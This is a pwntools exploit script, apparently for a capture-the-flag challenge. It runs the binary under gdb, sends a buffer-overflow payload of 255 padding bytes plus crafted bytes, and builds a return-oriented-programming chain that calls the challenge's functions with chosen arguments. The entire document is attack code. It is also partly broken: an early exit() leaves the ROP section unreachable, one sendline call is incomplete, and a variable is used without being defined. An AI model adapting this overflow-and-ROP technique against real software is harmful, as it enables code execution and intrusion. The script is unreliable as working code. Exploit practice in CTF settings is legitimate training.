import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context
import pwnlib.gdb

pwnlib.context.context.clear(arch='amd64', os='linux')
pwnlib.context.context.terminal = ["tmux", "splitw", "-h"]

def read_menu(conn):
    for _ in range(4):
        conn.recvline()

# Create gdb server
r = pwnlib.gdb.debug('./apps/chall', '''
layout asm
break *show_error+15
#break edit_text
continue
''')
# Goto edit text
r.sendline(b'1')
r.recvline() # Welcome text
read_menu(r) # empty buffer
# Send payload
payload = bytearray()
payload += ('a' * 255).encode('ascii')
payload += b'\0\x20\x50'
#print("sending", payload)
r.send(payload)
#print("recv")
r.recvline() # done
read_menu(r)
# Get error message
r.sendline(b'4')
r.interactive()
exit()
r.sendline(b'\4')


# Send the payload
r.sendline

# Reallocate
e = pwnlib.elf.ELF('apps/pwn')
e.address += main_address - e.functions['main'].address
print("main address in elf is", e.functions['main'].address)

# Create ROP
rop = pwnlib.rop.rop.ROP(e)
rop.call('Hawiya')
rop.call('Jahim')
rop.call('loss', [0x1337c0de, 0xdeadc0de - 0x1337c0de])
print(rop.dump())

# Create the payload
payload = bytearray()
payload += ('a' * (0x20 + 8)).encode('ascii') # SUB RSP,0x20 + PUSH RBP, overflow the stack
payload += bytes(rop)
print("sending", payload)
r.sendline(payload)
# Sho khosh
r.interactive()